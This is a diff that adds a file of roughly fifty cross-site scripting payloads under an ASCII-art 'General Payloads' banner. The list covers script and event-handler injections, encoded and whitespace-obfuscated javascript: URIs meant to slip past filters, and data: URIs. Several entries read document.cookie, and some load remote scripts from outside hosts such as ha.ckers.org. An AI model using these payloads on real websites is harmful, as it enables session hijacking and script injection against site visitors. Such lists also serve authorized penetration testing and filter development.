@@ -1,0 +1,112 @@
+
+=========================================================================================
+
+╔═╗┬─┐┌─┐┌─┐┌─┐  ╔═╗┬┌┬┐┌─┐  ╔═╗┌─┐┬─┐┬┌─┐┌┬┐┬┌┐┌┌─┐  
+║  ├┬┘│ │└─┐└─┐  ╚═╗│ │ ├┤   ╚═╗│  ├┬┘│├─┘ │ │││││ ┬  - General Payloads - 
+╚═╝┴└─└─┘└─┘└─┘  ╚═╝┴ ┴ └─┘  ╚═╝└─┘┴└─┴┴   ┴ ┴┘└┘└─┘ 
+
+=========================================================================================
+
+
+1 - <script>alert("XSS")</script>
+
+2 - "><img src=x onerror=prompt(document.cookie)> | navigator.userAgent | navigator.domain
+
+3 - "/><ScRipt>alert(/XSS/);</ScRipt>
+
+4 - "><iframe src=a onload=alert("Sir_Matrix") <
+
+5 - "><svg/onload=confirm(document.cookie);
+
+6 - <script>document.body.innerHTML="XSS"</script><noscript>
+
+7 - <BODY ONLOAD=alert(’XSS’)>
+
+8 - <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+9 - <IMG SRC="jav	ascript:alert('XSS');">
+
+10 - <IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+11 - <IMG SRC="   javascript:alert('XSS');">
+
+12 - <iframe src=http://ha.ckers.org/scriptlet.html >
+
+13 - <SCRIPT SRC=//ha.ckers.org/.j>
+
+14 - <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+15 - <BODY BACKGROUND="javascript:alert('XSS')">
+
+16 - <BODY ONLOAD=alert('XSS')>
+
+17 - <IMG DYNSRC="javascript:alert('XSS')">
+
+18 - <LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+
+19 - </TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+20 - <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+21 - <IMG LOWSRC="javascript:alert('XSS')">
+
+22 - <BR SIZE="&{alert('XSS')}">
+
+23 - <LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+
+24 - <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+
+25 - <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+
+26 - <div onmouseover='alert&lpar;Mk&rpar;'>Mk</div>
+
+27 - <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt('Mohamed-Khaled')">
+
+28 - <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+
+29 - <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> 
+
+30 - <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
+
+31 - <var onmouseover="prompt(19)">On Mouse Over</var>​
+
+32 - <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+
+33 - <img src="/" =_=" title="onerror='prompt(document.cookie)'">
+
+34 - <%<!--'%><script>alert(17);</script -->
+
+35 - <script src="data:text/javascript,alert(16)"></script>
+
+36 - <input value=<><iframe/src=javascript:confirm(12)>
+
+37 - <input type="text" value=``<div/onmouseover='alert(11)'>X</div>
+
+38 - <iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+
+39 - <iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+
+40 - <img src=`xx:xx`onerror=alert(1)>
+
+41 - <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+
+42 - <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
+
+43 - <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
+
+44 - <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+
+45 - <form><button formaction=javascript&colon;alert(')>L-O-L
+
+46 - <math><a xlink:href="//jsfiddle.net/t846h/">click
+
+47 - <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
+
+48 - <iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+
+49 - <a href="j&#97v&#97script&#x3A;&#97lert('XSS')">ClickMe</a>
+
+40 - "><svg/onload=prompt(0)>
+
+41 - "></script><script>alert("enjoy")</script>
+
